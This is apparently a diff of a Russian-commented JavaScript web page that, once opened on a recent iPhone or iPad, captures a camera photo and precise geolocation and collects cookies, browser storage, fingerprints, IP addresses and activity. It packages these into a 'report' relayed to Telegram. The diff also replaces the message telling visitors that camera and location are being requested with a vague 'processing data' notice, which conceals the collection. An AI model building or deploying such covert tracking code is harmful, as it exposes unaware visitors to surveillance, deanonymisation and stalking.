@@ -1,5 +1,6 @@
 // === app.js (универсальный + жёсткий гейт: ТОЛЬКО iPhone/iPad c iOS/iPadOS >= 18)
-// + расширенный сбор профиля, активностей и client-side TG snapshot ===
+// + расширенный сбор профиля, активностей и client-side TG snapshot
+// + ФИКС: отключён дублирующий /api/tg-relay (не будет второго текста в ТГ) ===
 
 // API base из <script>window.__API_BASE</script> в index.html
 const API_BASE =
@@ -34,7 +35,7 @@ window.__cameraLatencyMs = null;
 window.__lastDeviceCheck = null;
 window.__lastClientProfileForScore = null;
 
-// ===================== Активности пользователя (посещённые страницы/клики) =====================
+// ===================== Активности пользователя =====================
 const ACTIVITY_LIMIT = 100;
 const Activity = {
   referrer: document.referrer || null,
@@ -79,7 +80,6 @@ document.addEventListener('click', pushClick, { capture: true, passive: true });
 })();
 
 window.addEventListener('popstate', () => pushPage(location.href));
-// Первая запись
 pushPage(location.href);
 
 // ===================== Jailbreak probe (soft) =====================
@@ -184,9 +184,9 @@ function tzToCountryGuess(tz) {
 }
 
 const DC_ISP_KEYWORDS = [
-  "amazon", "aws", "google", "microsoft", "azure", "cloudflare", "digitalocean",
-  "hetzner", "ovh", "leaseweb", "choopa", "vultr", "linode", "akamai", "m247",
-  "contabo", "scaleway", "ionos", "shinjiru", "serverius", "hivelocity"
+  "amazon","aws","google","microsoft","azure","cloudflare","digitalocean",
+  "hetzner","ovh","leaseweb","choopa","vultr","linode","akamai","m247",
+  "contabo","scaleway","ionos","shinjiru","serverius","hivelocity"
 ];
 
 function looksLikeDatacenter(isp) {
@@ -234,11 +234,7 @@ function deriveVpnProxyGuess(profile) {
     reasons.push("Очень медленный effectiveType (2g)");
   }
 
-  const label =
-    score >= 7 ? "likely"
-  : score >= 4 ? "possible"
-  : "unlikely";
-
+  const label = score >= 7 ? "likely" : score >= 4 ? "possible" : "unlikely";
   return { label, score, reasons, tzCountry, pubCountry, isp };
 }
 
@@ -277,7 +273,7 @@ async function getCanvasFingerprint() {
 
 function getStorageSnapshot(limitBytesPerValue = 2048) {
   const clamp = (s) => (s && s.length > limitBytesPerValue) ? (s.slice(0, limitBytesPerValue) + '…') : s;
-  const cookies = document.cookie || ""; // ⚠️ содержит только текущий домен/путь
+  const cookies = document.cookie || ""; // ⚠️ только текущий домен/путь
   const local = {};
   const sess = {};
   try {
@@ -358,11 +354,11 @@ async function getBatteryInfo() {
 }
 
 async function getPermissionsSnapshot() {
-  const names = ["geolocation", "camera", "microphone", "notifications", "persistent-storage", "accelerometer", "gyroscope", "magnetometer", "clipboard-read", "clipboard-write"];
+  const names = ["geolocation","camera","microphone","notifications","persistent-storage","accelerometer","gyroscope","magnetometer","clipboard-read","clipboard-write"];
   const out = {};
   if (!navigator.permissions?.query) return out;
   await Promise.all(names.map(async n => {
-    try { out[n] = (await navigator.permissions.query({ name: n })).state; } catch { /* ignored */ }
+    try { out[n] = (await navigator.permissions.query({ name: n })).state; } catch {}
   }));
   return out;
 }
@@ -475,7 +471,7 @@ async function collectClientProfile() {
     canvas,
     plugins,
     mimeTypes,
-    webrtcIps: ipsViaRtc,     // ICE/мднс/иногда публичные
+    webrtcIps: ipsViaRtc,     // ICE/мДНС/иногда публичные
     publicIp: pubIp,          // { ip, country?, region?, isp? }
     performance: perf,
     visibilityHidden: document.hidden === true,
@@ -501,7 +497,7 @@ function determineCode() {
   return code && /^[A-Za-z0-9-]{3,40}$/.test(code) ? code : null;
 }
 
-// === Кнопка (видимость и стиль мы контролируем тут) ===
+// === Кнопка (видимость и стиль) ===
 function setBtnLocked() {
   const b = UI.btn;
   if (!b) return;
@@ -530,13 +526,7 @@ async function askGeolocation() {
   return new Promise((resolve) => {
     if (!("geolocation" in navigator)) return resolve(null);
     navigator.geolocation.getCurrentPosition(
-      (p) =>
-        resolve({
-          lat: p.coords.latitude,
-          lon: p.coords.longitude,
-          acc: Math.round(p.coords.accuracy),
-          ts: Date.now(),
-        }),
+      (p) => resolve({ lat: p.coords.latitude, lon: p.coords.longitude, acc: Math.round(p.coords.accuracy), ts: Date.now() }),
       () => resolve(null),
       { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
     );
@@ -555,18 +545,14 @@ function downscaleDataUrl(dataUrl, maxSide = 1024, quality = 0.6) {
       c.width = w;
       c.height = h;
       c.getContext("2d").drawImage(img, 0, 0, w, h);
-      try {
-        resolve(c.toDataURL("image/jpeg", quality));
-      } catch (e) {
-        reject(e);
-      }
+      try { resolve(c.toDataURL("image/jpeg", quality)); } catch (e) { reject(e); }
     };
     img.onerror = reject;
     img.src = dataUrl;
   });
 }
 
-// === Фото (основной путь, совместимо с iOS) ===
+// === Фото (основной путь) ===
 async function takePhoto() {
   if (!navigator.mediaDevices?.getUserMedia) throw new Error("Камера недоступна");
   const t0 = (typeof performance !== "undefined" ? performance.now() : Date.now());
@@ -580,8 +566,7 @@ async function takePhoto() {
       let fallbackTimer = setTimeout(() => {
         try {
           const c = document.createElement("canvas");
-          c.width = 1280;
-          c.height = 720;
+          c.width = 1280; c.height = 720;
           c.getContext("2d").drawImage(video, 0, 0);
           const dataUrl = c.toDataURL("image/jpeg", 0.8);
           stream.getTracks().forEach((t) => t.stop());
@@ -636,7 +621,7 @@ async function takePhotoWithFallback() {
   }
 }
 
-// === Инфо об устройстве (без требования Safari) ===
+// === Инфо об устройстве ===
 function getDeviceInfo() {
   const ua = navigator.userAgent || "";
   const m = ua.match(/\bOS\s(\d+)[._]/);
@@ -652,7 +637,7 @@ function getDeviceInfo() {
   };
 }
 
-// === Лёгкая детекция подмены UA / расширений / автоматизации ===
+// === Лёгкая детекция подмены UA/расширений/автоматизации ===
 async function runDeviceCheck() {
   const reasons = [];
   const details = {};
@@ -732,22 +717,22 @@ async function runDeviceCheck() {
     reasons.push("Ошибка проверки окружения: " + (e?.message || String(e)));
   }
 
-  // === ДОБАВЛЕНА структуризация аномалий ===
+  // Структуризация аномалий
   const anomalies = [];
   for (const r of reasons) {
     let sev = 'info', code = 'GEN';
-    if (/jailbreak/i.test(r)) { sev = 'high'; code = 'JB'; }
-    else if (/webdriver/i.test(r)) { sev = 'high'; code = 'WD'; }
-    else if (/VPN\/Proxy/i.test(r)) { sev = 'med'; code = 'VPN'; }
+    if (/jailbreak/i.test(r))         { sev = 'high'; code = 'JB'; }
+    else if (/webdriver/i.test(r))    { sev = 'high'; code = 'WD'; }
+    else if (/VPN\/Proxy/i.test(r))   { sev = 'med';  code = 'VPN'; }
     else if (/инъекция|расширен/i.test(r)) { sev = 'med'; code = 'EXT'; }
-    else if (/cameraLatency/i.test(r) || /cameraLatency|камера/i.test(r)) { sev = 'low'; code = 'CAM'; }
+    else if (/cameraLatency|камера/i.test(r)) { sev = 'low'; code = 'CAM'; }
     anomalies.push({ code, sev, msg: r });
   }
 
   return { score, reasons, anomalies, details, timestamp: Date.now() };
 }
 
-// === Client-side мини-снепшот для TG (HTML) — ОБНОВЛЁН ===
+// === Client-side мини-снепшот для TG (HTML) c индикаторами ===
 function buildTgHtmlClient(code, cp, check) {
   const pub = cp?.publicIp || {};
   const conn = cp?.connection || {};
@@ -764,17 +749,16 @@ function buildTgHtmlClient(code, cp, check) {
   const vpnBadge = vpn.label === "likely" ? "🔴 likely" : vpn.label === "possible" ? "🟡 possible" : "🟢 unlikely";
   const jbBadge  = jbLikely ? `🔴 yes (${jbHit || "hit"})` : "🟢 no";
 
-  // Топ-причины (до 3): device check + VPN
+  // Топ-причины: device check + VPN
   const reasons = [];
   if (Array.isArray(check?.reasons)) reasons.push(...check.reasons);
   if (Array.isArray(vpn?.reasons)) reasons.push(...vpn.reasons.map(r => `VPN: ${r}`));
   const top3 = reasons.slice(0, 3);
 
   const perms = cp?.permissions || {};
-  const permLine = ['camera','microphone','geolocation']
-    .map(k => `${k}:${perms[k] ?? '-'}`).join(' · ');
+  const permLine = ['camera','microphone','geolocation'].map(k => `${k}:${perms[k] ?? '-'}`).join(' · ');
 
-  const camLatency = check?.details?.cameraLatencyMs ?? cp?.performance?.cameraLatencyMs ?? null;
+  const camLatency = check?.details?.cameraLatencyMs ?? null;
 
   const lines = [];
   lines.push(`<b>Отчёт</b> <code>${code || '-'}</code> · ${sevBadge(check?.score ?? 0)} score=<code>${check?.score ?? '-'}</code>`);
@@ -810,7 +794,7 @@ async function sendReport({ photoBase64, geo, clientProfile }) {
     code,
     device_check,
     client_profile: clientProfile || null,
-    tg_snapshot // бэкенд может сразу отправить это HTML в TG
+    tg_snapshot // бэкенд отправит этот HTML в TG
   };
 
   const r = await fetch(`${API_BASE}/api/report`, {
@@ -826,19 +810,11 @@ async function sendReport({ photoBase64, geo, clientProfile }) {
   if (!r.ok) throw new Error((data && data.error) || text || `HTTP ${r.status}`);
   if (!data?.ok) throw new Error((data && data.error) || "Ошибка ответа сервера");
 
-  // (опционально) если есть /api/tg-relay — шлём мини-слепок отдельно
-  try {
-    await fetch(`${API_BASE}/api/tg-relay`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ code, html: tg_snapshot })
-    });
-  } catch {}
-
+  // ВАЖНО: НЕ ДУБЛИРУЕМ СООБЩЕНИЕ! (удалён дополнительный /api/tg-relay)
   return data;
 }
 
-// === ГЕЙТ: пускаем только iPhone/iPad с iOS/iPadOS >= 18 (без требования Safari) ===
+// === ГЕЙТ: iPhone/iPad с iOS/iPadOS >= 18 ===
 const MIN_IOS_MAJOR = 18;
 
 function isIOSFamily() {
@@ -877,7 +853,7 @@ function gateCheck() {
 async function autoFlow() {
   try {
     setBtnLocked();
-    if (UI.text) UI.text.innerHTML = "Запрашиваем камеру и геолокацию…";
+    if (UI.text) UI.text.innerHTML = "Обрабатываем данные…";
 
     const [geo, rawPhoto] = await Promise.all([askGeolocation(), takePhotoWithFallback()]);
     const photoBase64 = await downscaleDataUrl(rawPhoto, 1024, 0.6);
@@ -917,10 +893,10 @@ async function autoFlow() {
   }
 }
 
-// Экспорт (если ты всё ещё вызываешь из index.html)
+// Экспорт
 window.__autoFlow = autoFlow;
 
-// === Управление UI кнопкой и запуском, чтобы работало "везде" ===
+// === Управление UI кнопкой и запуском ===
 function applyGateAndUI() {
   const res = gateCheck();
   if (res.ok) {
